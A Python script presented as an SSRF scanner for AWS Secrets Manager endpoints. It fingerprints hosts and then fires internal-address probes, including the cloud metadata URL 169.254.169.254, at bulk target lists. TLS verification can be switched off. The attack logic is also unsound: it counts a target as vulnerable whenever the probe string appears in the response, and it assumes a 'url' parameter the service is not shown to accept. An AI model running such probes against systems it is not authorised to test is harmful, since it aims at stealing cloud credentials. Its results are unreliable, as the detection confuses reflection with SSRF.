#!/usr/bin/env python3
"""
AWS Secrets Manager SSRF Scanner
================================
Scans AWS Secrets Manager endpoints for potential server-side request forgery (SSRF) vulnerabilities.

Vulnerability details:
  - AWS Secrets Manager APIs can be abused via poorly validated inputs that result in backend servers making requests to arbitrary URLs.
  - Common SSRF tricks include bypassing input validation with CRLF injection, malformed protocol inputs, or DNS rebinding.
  - Misconfigured services accessing Secrets Manager can leak critical credentials or internal data.

Usage:
  # Scan a single AWS Secrets Manager endpoint
  python aws_secret_manager_ssrf_scanner.py --target https://secretsmanager.example.com

  # Scan a list of endpoints for SSRF vulnerabilities
  python aws_secret_manager_ssrf_scanner.py --list endpoints.txt --output findings.json

  # Safe mode — detection only, skips active SSRF probes
  python aws_secret_manager_ssrf_scanner.py --list endpoints.txt --safe

CLI Arguments:
  --target: Specify a single target URL.
  --list: Provide a file containing newline-delimited URLs to scan.
  --output: Save findings as JSON.
  --safe: Perform detection-only scans without SSRF probes.
  --concurrency: Default is 10. Adjust concurrency for faster bulk scans.
  --no-verify: Disable SSL verification.

References:
  - AWS Secrets Manager API Documentation: https://docs.aws.amazon.com/secretsmanager
  - SSRF Exploitation Techniques: https://portswigger.net/web-security/ssrf
  - OWASP SSRF Documentation: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
"""

import asyncio
import json
import re
import argparse
from datetime import datetime
from urllib.parse import urlparse

import httpx

SEMAPHORE_LIMIT = 10
REQUEST_TIMEOUT = 10

# Detection markers for AWS Secrets Manager endpoints
SECRETS_MANAGER_FINGERPRINTS = [
    "AWS Secrets Manager",
    "X-Amzn-RequestId",
    "application/x-amz-json",
    "SecretsManager.getSecretValue",
    "AWS4-HMAC-SHA256",
]

# Paths likely to reveal AWS Secrets Manager usage
DETECTION_PATHS = [
    "/",
    "/v1/secrets/",
    "/api/",
    "/metadata/",
]

# Logical SSRF probes
SSRF_PROBES = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://internal-service/",
    "http://example.com@external-host/",
]

ANSI_COLORS = {
    'CRITICAL': '\033[91m',
    'HIGH': '\033[93m',
    'INFO': '\033[92m',
    'RESET': '\033[0m',
}


# ── Helpers ───────────────────────────────────────────────────────────────────

def normalize_url(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


def colorize(level: str, message: str) -> str:
    return f"{ANSI_COLORS.get(level, '')}{message}{ANSI_COLORS['RESET']}"


async def fetch(client: httpx.AsyncClient, url: str):
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except (httpx.RequestError, httpx.TimeoutException):
        return None


async def detect_secrets_manager(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect whether a URL is using AWS Secrets Manager.
    Returns detection info as dict, or None if not detected.
    """
    async with semaphore:
        detected = False
        for path in DETECTION_PATHS:
            full_url = base_url + path
            response = await fetch(client, full_url)
            if response and any(marker in response.text for marker in SECRETS_MANAGER_FINGERPRINTS):
                detected = True
                break
        return {"url": base_url, "detected": detected}


async def scan_ssrf(client: httpx.AsyncClient, url: str, probe: str, semaphore: asyncio.Semaphore):
    """
    Perform SSRF probes against a detected endpoint.
    Returns evidence of SSRF vulnerability or None if safe.
    """
    async with semaphore:
        try:
            response = await client.get(url, params={"url": probe}, timeout=REQUEST_TIMEOUT)
            if response.status_code in {200, 301, 302} and probe in response.text:
                return {"probe": probe, "response": response.text[:200]}
        except httpx.RequestError:
            pass
    return None


async def scan_endpoint(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore, safe: bool):
    """
    Scan a single endpoint for detection and SSRF vulnerabilities.
    """
    results = await detect_secrets_manager(client, base_url, semaphore)
    if results and results.get("detected"):
        if safe:
            return {"url": base_url, "status": "Detected, safe mode enabled"}
        vulnerabilities = []
        for probe in SSRF_PROBES:
            evidence = await scan_ssrf(client, base_url, probe, semaphore)
            if evidence:
                vulnerabilities.append(evidence)
        return {"url": base_url, "status": "Vulnerable", "details": vulnerabilities}
    return {"url": base_url, "status": "Not detected"}


async def main(args):
    targets = []

    # Parse input for targets
    if args.target:
        targets.append(normalize_url(args.target))
    elif args.list:
        with open(args.list, "r") as file:
            targets = [normalize_url(line.strip()) for line in file.readlines() if line.strip()]

    concurrency = args.concurrency or SEMAPHORE_LIMIT
    semaphore = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [scan_endpoint(client, target, semaphore, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    # Print results
    for result in results:
        if result["status"] == "Not detected":
            print(colorize('INFO', f"[INFO] {result['url']} - Service not detected"))
        elif result["status"] == "Detected, safe mode enabled":
            print(colorize('HIGH', f"[HIGH] {result['url']} - Service detected (safe mode, no probes)"))
        elif result["status"] == "Vulnerable":
            print(colorize('CRITICAL', f"[CRITICAL] {result['url']} - SSRF Vulnerable"))
            for detail in result.get("details", []):
                print(f"  Probe: {detail['probe']}, Response: {detail['response'][:100]}")

    # Write results to output file
    if args.output:
        with open(args.output, "w") as file:
            json.dump(results, file, indent=4)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AWS Secrets Manager SSRF Scanner")
    parser.add_argument("--target", help="Target URL for scanning.")
    parser.add_argument("--list", help="File containing list of target URLs.")
    parser.add_argument("--output", help="Output file for findings in JSON format.")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode, no SSRF probes.")
    parser.add_argument("--concurrency", type=int, help="Number of concurrent requests (default: 10).")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification.")
    args = parser.parse_args()

    asyncio.run(main(args))
